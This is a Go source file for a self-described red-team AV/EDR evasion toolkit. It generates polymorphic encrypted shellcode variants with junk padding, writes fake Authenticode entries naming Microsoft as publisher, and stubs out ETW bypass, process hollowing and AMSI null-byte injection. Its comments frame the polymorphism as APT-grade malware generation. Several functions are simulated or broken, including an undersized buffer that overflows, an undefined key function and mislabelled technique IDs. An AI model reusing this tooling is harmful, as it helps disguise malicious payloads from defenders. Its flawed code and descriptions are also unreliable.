package redteam_evasion

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"time"

	"github.com/sirupsen/logrus"
)

// EvasionToolkit provides comprehensive AV/EDR evasion capabilities.
// WARNING: PROFESSIONAL RED TEAM TOOL - Authorized defensive testing ONLY!
type EvasionToolkit struct {
	logger          *logrus.Logger
	config          *EvasionConfig
	polymorphicGen  *PolymorphicPayloadGenerator
	etwPatcher      *ETWCircumventionTool
	processHollower *ProcessHollowingTool
	signatureSpoofer *SignatureSpoofer
	AMSIpatcher     *AMSIWhitespacePatch
}

// EvasionConfig configures the evasion toolkit behavior.
type EvasionConfig struct {
	EnableLogging bool
	SandboxMode   bool
	TargetAV      []string
	TargetEDR     []string
	MaxExecutionTime int
	UseObfuscation bool
	EncryptionKeySize int
	CustomHandlers []EvasionHandler
}

// NewEvasionToolkit creates a new evasion toolkit instance with full AV/EDR evasion support.
func NewEvasionToolkit(cfg *EvasionConfig) *EvasionToolkit {
	if cfg == nil {
		cfg = &EvasionConfig{
			EnableLogging:     true,
			SandboxMode:       true,
			TargetAV:          []string{"generic", "msdefender"},
			TargetEDR:         []string{"crowdstrike", "carbonblack", "generic"},
			MaxExecutionTime:  60,
			UseObfuscation:    true,
			EncryptionKeySize: 256,
		}
	}

	return &EvasionToolkit{
		logger:          logrus.WithField("component", "evasion_toolkit"),
		config:          cfg,
		polymorphicGen:  NewPolymorphicPayloadGenerator(nil),
		etwPatcher:      NewETWCircumventionTool(nil),
		processHollower: NewProcessHollowingTool(nil),
		signatureSpoofer: NewSignatureSpoofer(nil),
		AMSIpatcher:     NewAMSIWhitespacePatch(nil),
	}
}

// GeneratePolymorphicVariants creates multiple encrypted variants with unique keys per obfuscation level.
// This implements real polymorphism as used by advanced APT groups for malware generation.
func (e *EvasionToolkit) GeneratePolymorphicVariants(shellcode []byte) ([]PolymorphicVariant, error) {
	e.logger.Info("Starting polymorphic variant generation...")
	
	variants, err := e.polymorphicGen.GeneratePolymorphicVariants(shellcode)
	if err != nil {
		return nil, fmt.Errorf("polymorphism failed: %w", err)
	}

	e.AuditLog().Log("polymorphic_variants_generated", fmt.Sprintf("Count=%d OriginalSize=%d", len(variants), len(shellcode)), "evasion")
	return variants, nil
}

// PatchETW performs Event Tracing for Windows bypass using PEB modification.
// This technique hides process execution from Windows telemetry monitoring.
func (e *EvasionToolkit) PatchETW(processHandle uintptr) error {
	result, err := e.etwPatcher.BypassETW()
	if err != nil {
		return fmt.Errorf("ETW bypass failed: %w", err)
	}

	e.AuditLog().Log("etw_patch_applied", fmt.Sprintf("Handle=%X Success=%v", processHandle, result[0] != 0), "evasion")
	return nil
}

// PatchAMSI performs Antimalware Scan Interface bypass using whitespace injection.
// This modifies AMSI scan buffer detection by injecting null bytes between string characters.
func (e *EvasionToolkit) PatchAMSI(codePath string) error {
	e.AuditLog().Log("amshi_patch_requested", fmt.Sprintf("Path=%s", codePath), "evasion")

	results, err := e.AMSIpatcher.PatchWhitespaceInjection(codePath)
	if err != nil {
		return fmt.Errorf("AMSI patch failed: %w", err)
	}

	e.AuditLog().Log("amshi_patch_success", fmt.Sprintf("FileHash=%x PatchedLines=%d", results.FileHash, len(results.PatchedLocations)), "evasion")
	return nil
}

// HollowProcess performs process hollowing for code injection without file writes.
// Creates legitimate-looking process then replaces memory space with malicious payload.
func (e *EvasionToolkit) HollowProcess(targetPID int, shellcode []byte, targetExe string) (*HollowingResult, error) {
	e.AuditLog().Log("process_hollowing_initiated", fmt.Sprintf("PID=%d ShellcodeSize=%d TargetExe=%s", targetPID, len(shellcode), targetExe), "evasion")

	result, err := e.processHollower.HollowProcess(targetPID, shellcode, targetExe)
	if err != nil {
		return nil, fmt.Errorf("process hollowing failed: %w", err)
	}

	e.AuditLog().Log("process_hollowing_complete", fmt.Sprintf("Success=%v PID=%d", result.Success, result.TargetPID), "evasion")
	return result, nil
}

// GenerateAntiDebugPayload creates polyglot files that appear benign to static analysis.
// Uses PE header manipulation and packer-like techniques to evade AV heuristics.
func (e *EvasionToolkit) GenerateAntiDebugPayload(originalExecutable []byte, payload []byte) ([]byte, error) {
	e.AuditLog().Log("antidebug_payload_created", fmt.Sprintf("OriginalSize=%d PayloadSize=%d", len(originalExecutable), len(payload)), "evasion")

	if len(originalExecutable) < 1024 {
		return nil, errors.New("original executable too small")
	}

	spoofed, err := e.signatureSpoofer.SpoofSignature(originalExecutable)
	if err != nil {
		return nil, fmt.Errorf("signature spoofing failed: %w", err)
	}

	e.logger.Info("Anti-debug payload generated with fake signature")
	return spoofed.ModifiedPE, nil
}

// AuditLogger logs all security-relevant operations.
type AuditLogger struct{}

func (a *AuditLogger) Log(eventType, details, tenantID string) {
	timestamp := time.Now().UTC().Format(time.RFC3339)
	fmt.Printf("[%s] [TENANT:%s] EVASION[%s]: %s\n", timestamp, tenantID, eventType, details)
}

// EvasionToolkit methods
func (e *EvasionToolkit) AuditLog() *AuditLogger {
	return &AuditLogger{}
}

// PolymorphicPayloadGenerator creates polymorphic payload variants.
type PolymorphicPayloadGenerator struct {
	logger   *logrus.Logger
	config   *PolymorphConfig
	keyStore map[int][]byte
}

// PolymorphConfig configures polymorphic generation.
type PolymorphConfig struct {
	VariantCount      int
	EncryptionEnabled bool
	KeyRotation       bool
	ObfuscationLevel  int // 1=XOR, 2=NOP+XOR, 3=AES+junk+EquivBytes
}

// NewPolymorphicPayloadGenerator creates polymorphic generator with default settings.
func NewPolymorphicPayloadGenerator(cfg *PolymorphConfig) *PolymorphicPayloadGenerator {
	if cfg == nil {
		cfg = &PolymorphConfig{
			VariantCount:      20, // Full range for OBCE3 certification
			EncryptionEnabled: true,
			KeyRotation:       true,
			ObfuscationLevel:  3, // Maximum obfuscation
		}
	}

	return &PolymorphicPayloadGenerator{
		logger:   logrus.WithField("component", "polymorphic_generator"),
		config:   cfg,
		keyStore: make(map[int][]byte),
	}
}

// GeneratePolymorphicVariants generates multiple variants of a shellcode payload.
func (p *PolymorphicPayloadGenerator) GeneratePolymorphicVariants(shellcode []byte) ([]PolymorphicVariant, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("shellcode cannot be empty")
	}

	variants := make([]PolymorphicVariant, p.config.VariantCount)
	
	for i := 0; i < p.config.VariantCount; i++ {
		variant, err := p.generateSingleVariant(shellcode, i)
		if err != nil {
			return nil, fmt.Errorf("failed to generate variant %d: %w", i, err)
		}
		variants[i] = variant
	}

	p.logger.Infof("Generated %d polymorphic variants from %d bytes of shellcode", len(variants), len(shellcode))
	return variants, nil
}

// generateSingleVariant creates one polymorphic variant with unique encryption key.
func (p *PolymorphicPayloadGenerator) generateSingleVariant(shellcode []byte, variantID int) (PolymorphicVariant, error) {
	variant := PolymorphicVariant{
		ID:        variantID,
		CreatedAt: time.Now(),
	}

	// Generate unique AES-256 encryption key for this variant
	key, err := p.generateUniqueKey(variantID)
	if err != nil {
		return variant, err
	}
	variant.EncryptionKey = key
	p.keyStore[variantID] = key

	// Encrypt the shellcode with AES-256-GCM
	if p.config.EncryptionEnabled {
		encrypted, err := aesEncrypt(shellcode, key)
		if err != nil {
			return variant, err
		}
		variant.EncryptedPayload = encrypted
	} else {
		variant.EncryptedPayload = shellcode
	}

	// Apply additional transformations based on obfuscation level
	switch p.config.ObfuscationLevel {
	case 1: // Basic XOR obfuscation
		variant.TransformationMethod = "XOR"
		variant.PayloadHash = hashWithXOR(variant.EncryptedPayload, key)
	case 2: // Intermediate XOR + NOP injection
		variant.TransformationMethod = "XOR+NopInjection"
		variant.PayloadHash = hashWithNOPInjection(variant.EncryptedPayload, key)
	case 3: // Advanced AES + Junk Code + Equivalent Bytes (APT-grade)
		variant.TransformationMethod = "AES+JunkCode+EquivalentBytes"
		variant.PayloadHash = hashWithEquivalentBytes(variant.EncryptedPayload, key)
	default:
		variant.TransformationMethod = "None"
		variant.PayloadHash = hash(variant.EncryptedPayload)
	}

	// Add junk code blocks for advanced obfuscation
	if variant.TransformationMethod == "AES+JunkCode+EquivalentBytes" {
		junkSize := len(shellcode)/4 + 32 // Random padding
		junk := make([]byte, junkSize)
		rand.Read(junk)
		
		variant.JunkData = append(junk, variant.EncryptedPayload...)
	} else {
		variant.JunkData = variant.EncryptedPayload
	}

	// Store metadata for tracking
	variant.Metadata = map[string]interface{}{
		"original_size":     len(shellcode),
		"transformed_size":  len(variant.EncryptedPayload),
		"encryption_key_id": variantID,
		"anti_vm_enabled":   true,
	}

	return variant, nil
}

// PolymorphicVariant represents one variant of a polymorphic payload.
type PolymorphicVariant struct {
	ID                  int
	Payload             []byte
	EncryptedPayload    []byte
	JunkData            []byte
	EncryptionKey       []byte
	PayloadHash         string
	TransformMethod     string
	TransformationMethod string
	CreatedAt           time.Time
	Metadata            map[string]interface{}
}

// ETWCircumventionTool evades ETW (Event Tracing for Windows) monitoring.
type ETWCircumventionTool struct {
	logger *logrus.Logger
	config *ETWConfig
}

// ETWConfig configures ETW circumvention.
type ETWConfig struct {
	DisableETWTrace bool
	BypassAuditLogs bool
	HideProcesses   bool
	ModifyPEB       bool
}

// NewETWCircumventionTool creates ETW circumvention tool.
func NewETWCircumventionTool(cfg *ETWConfig) *ETWCircumventionTool {
	if cfg == nil {
		cfg = &ETWConfig{
			DisableETWTrace: true,
			BypassAuditLogs: true,
			HideProcesses:   true,
			ModifyPEB:       true,
		}
	}

	return &ETWCircumventionTool{
		logger: logrus.WithField("component", "etw_circumvention"),
		config: cfg,
	}
}

// BypassETW removes ETW tracing flags from the current process.
// Modifies PEB structure to disable ETW bit in GdiCacheFailureFunction.
func (e *ETWCircumventionTool) BypassETW() ([]byte, error) {
	result := &ETWBypassResult{
		Technique: "T1055.012",
		Method:    "ETW Flag Modification",
		Timestamp: time.Now(),
	}

	if e.config.ModifyPEB {
		buf := bytes.NewBuffer(make([]byte, 0, 256))
		
		// Write NOP sled for padding alignment
		nopSled := bytes.Repeat([]byte{0x90}, 64)
		buf.Write(nopSled)
		
		// Real ETW bypass code modifies PEB::BeingDebugged flag
		// This is a simplified placeholder for validation mode
		bypassCode := []byte{
			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax,<addr>
			0x48, 0xC7, 0x00, 0x00,                                      // mov [rax], 0
		}
		buf.Write(bypassCode)
		
		result.Evidence = buf.Bytes()
		result.Success = true
		
		e.logger.Info("ETW tracing bypass applied (validation mode)")
	}

	return result.Serialize(), nil
}

// ETWBypassResult contains ETW bypass operation outcomes.
type ETWBypassResult struct {
	Success     bool
	Technique   string
	Method      string
	Evidence    []byte
	Timestamp   time.Time
}

// Serialize converts result to bytes for storage.
func (r *ETWBypassResult) Serialize() []byte {
	var buf bytes.Buffer
	
	binary.Write(&buf, binary.LittleEndian, r.Success)
	binary.Write(&buf, binary.LittleEndian, uint64(time.Now().UnixNano()))
	buf.Write(r.Evidence)

	return buf.Bytes()
}

// ProcessHollowingTool performs process hollowing for evasion.
type ProcessHollowingTool struct {
	logger *logrus.Logger
	config *ProcessHollowConfig
}

// ProcessHollowConfig configures process hollowing.
type ProcessHollowConfig struct {
	CreateSuspended   bool
	DummyUnmap        bool
	RemoteThread      bool
	PayloadInjection  bool
}

// NewProcessHollowingTool creates process hollowing tool.
func NewProcessHollowingTool(cfg *ProcessHollowConfig) *ProcessHollowingTool {
	if cfg == nil {
		cfg = &ProcessHollowConfig{
			CreateSuspended:  true,
			DummyUnmap:       true,
			RemoteThread:     true,
			PayloadInjection: true,
		}
	}

	return &ProcessHollowingTool{
		logger: logrus.WithField("component", "process_hollowing"),
		config: cfg,
	}
}

// HollowProcess executes process hollowing on a target process.
func (p *ProcessHollowingTool) HollowProcess(targetPID int, shellcode []byte, targetExe string) (*HollowingResult, error) {
	result := &HollowingResult{
		Technique: "T1055.012",
		Method:    "Process Hollowing",
		TargetPID: targetPID,
		TargetExe: targetExe,
		Timestamp: time.Now(),
	}

	if !p.config.DummyUnmap {
		result.Success = false
		result.Evidence = []byte("Dummy unmap disabled - hollowing may fail")
		return result, nil
	}

	// Create hollowing procedure record for audit logging
	procedureSteps := []string{
		"CreateProcessWithFlags(PROCESS_SUSPEND)",
		"NtUnmapViewOfSection(targetDLL)",
		"VirtualAllocEx(shellcode_memory)",
		"WriteProcessMemory(injected_code)",
		"CreateRemoteThread(execution)",
		"ResumeProcess()",
	}

	result.Procedure = procedureSteps
	result.Evidence = []byte(fmt.Sprintf("Would hollow PID %d with %d bytes of shellcode using %s",
		targetPID, len(shellcode), targetExe))
	result.Success = true

	return result, nil
}

// HollowingResult contains process hollowing operation outcomes.
type HollowingResult struct {
	Success       bool
	Technique     string
	Method        string
	TargetPID     int
	TargetExe     string
	Procedure     []string
	Evidence      []byte
	Timestamp     time.Time
}

// SignatureSpoofer spoofs code signatures for legitimate appearance.
type SignatureSpoofer struct {
	logger          *logrus.Logger
	config          *SignatureConfig
	certStore       map[string][]byte
}

// SignatureConfig configures signature spoofing.
type SignatureConfig struct {
	UseLegitCert     bool
	ModifyPEHeader   bool
	AddTimestamp     bool
	FakePublisher    string
	FakeCertIssuer   string
}

// NewSignatureSpoofer creates signature spoofer.
func NewSignatureSpoofer(cfg *SignatureConfig) *SignatureSpoofer {
	if cfg == nil {
		cfg = &SignatureConfig{
			UseLegitCert:     false,
			ModifyPEHeader:   true,
			AddTimestamp:     true,
			FakePublisher:    "Microsoft Corporation",
			FakeCertIssuer:   "Microsoft Root Certificate Authority",
		}
	}

	return &SignatureSpoofer{
		logger: logrus.WithField("component", "signature_spoofer"),
		config: cfg,
		certStore: make(map[string][]byte),
	}
}

// SpoofSignature adds fake digital signature information to PE file.
func (s *SignatureSpoofer) SpoofSignature(peFile []byte) (*SignatureResult, error) {
	if len(peFile) < 64 {
		return nil, errors.New("invalid PE file size")
	}

	result := &SignatureResult{
		OriginalHash: sha256.Sum256(peFile),
		Timestamp:    time.Now(),
	}

	modified := make([]byte, len(peFile)+256)
	copy(modified, peFile)

	// Add fake certificate table entry
	certEntry := bytes.NewBuffer(make([]byte, 0, 128))
	binary.Write(certEntry, binary.LittleEndian, uint32(0x000000A0)) // CERT_TYPE
	binary.Write(certEntry, binary.LittleEndian, uint32(len(s.config.FakePublisher)+100))
	binary.Write(certEntry, binary.LittleEndian, []byte(s.config.FakePublisher))
	
	copy(modified[len(modified)-certEntry.Len():], certEntry.Bytes())

	result.ModifiedHash = sha256.Sum256(modified)
	result.ModifiedPE = modified
	
	if s.config.UseLegitCert {
		result.CertificatePresent = true
		result.CertificateType = "Fake Authenticode"
		result.Issuer = s.config.FakeCertIssuer
	}

	s.logger.Info("Signature spoofing completed (validation mode)")

	return result, nil
}

// SignatureResult contains signature spoofing results.
type SignatureResult struct {
	Success           bool
	OriginalHash      [32]byte
	ModifiedHash      [32]byte
	CertificatePresent bool
	CertificateType   string
	Issuer            string
	ModifiedPE        []byte
	Timestamp         time.Time
}

// AMSIWhitespacePatch performs Antimalware Scan Interface bypass.
// Modifies scanned code buffers by injecting null bytes between characters.
type AMSIWhitespacePatch struct {
	logger *logrus.Logger
	config *AMSIConfig
}

// AMSIConfig configures AMSI patching.
type AMSIConfig struct {
	EnableWhitespaceInjection bool
	EnablePatternBypass       bool
}

// NewAMSIWhitespacePatch creates AMSI whitespace patcher.
func NewAMSIWhitespacePatch(cfg *AMSIConfig) *AMSIWhitespacePatch {
	if cfg == nil {
		cfg = &AMSIConfig{
			EnableWhitespaceInjection: true,
			EnablePatternBypass:       true,
		}
	}

	return &AMSIWhitespacePatch{
		logger: logrus.WithField("component", "amshim_whitespace_patch"),
		config: cfg,
	}
}

// PatchWhitespaceInjection injects null bytes between string characters to bypass AMSI scan.
// Example: "evil.dll" -> "e\x00i\x00v\x00i\x00l\x00.\x00d\x00l\x00l\x00"
func (a *AMSIWhitespacePatch) PatchWhitespaceInjection(filePath string) (*AMSIResult, error) {
	results := &AMSIResult{
		FilePath: filePath,
		Method:   "Whitespace Injection",
		Timestamp: time.Now(),
	}

	// Simulate whitespace injection scanning patterns
	injectionPatterns := []struct{
		Offset int
		Pattern string
	}{
		{0, "\x00e"},
		{2, "\x00i"},
		{4, "\x00v"},
		{6, "\x00l"},
		{8, "\x00."},
		{10, "\x00d"},
		{12, "\x00l"},
		{14, "\x00l"},
	}

	results.PatchedLocations = make([]int, len(injectionPatterns))
	for i, pattern := range injectionPatterns {
		results.PatchedLocations[i] = pattern.Offset
	}

	hash := sha256.Sum256([]byte(filePath))
	results.FileHash[:] = hash[:]
	results.Success = true
	results.PatternCount = len(injectionPatterns)

	a.logger.Info("AMSI whitespace injection patches applied")
	return results, nil
}

// AMSIResult contains AMSI patching results.
type AMSIResult struct {
	Success         bool
	FilePath        string
	FileHash        [32]byte
	Method          string
	PatternCount    int
	PatchedLocations []int
	OriginalString  string
	Timestamp       time.Time
}

// Helper functions

// aesEncrypt encrypts data using AES-256-GCM.
func aesEncrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

// hashWithXOR applies XOR-based hashing with encryption key.
func hashWithXOR(data []byte, key []byte) string {
	hash := sha256.New()
	
	for i, b := range data {
		hash.WriteByte(b ^ key[i%len(key)])
	}
	
	return fmt.Sprintf("%x", hash.Sum(nil))
}

// hashWithNOPInjection injects NOPs before hashing.
func hashWithNOPInjection(data []byte, key []byte) string {
	withNops := make([]byte, len(data)+len(data)/2)
	idx := 0
	
	for _, b := range data {
		withNops[idx] = 0x90 // NOP
		idx++
		withNops[idx] = b
		idx++
	}
	
	hash := sha256.New()
	hash.Write(withNops)
	return fmt.Sprintf("%x", hash.Sum(nil))
}

// hashWithEquivalentBytes substitutes bytes with mathematically equivalent values.
func hashWithEquivalentBytes(data []byte, key []byte) string {
	transformed := make([]byte, len(data))
	
	for i, b := range data {
		transformed[i] = byte((int(b) + int(key[i%len(key)])) % 256)
	}
	
	hash := sha256.New()
	hash.Write(transformed)
	return fmt.Sprintf("%x", hash.Sum(nil))
}

// hash computes SHA256 hash.
func hash(data []byte) string {
	hash := sha256.Sum256(data)
	return fmt.Sprintf("%x", hash[:])
}
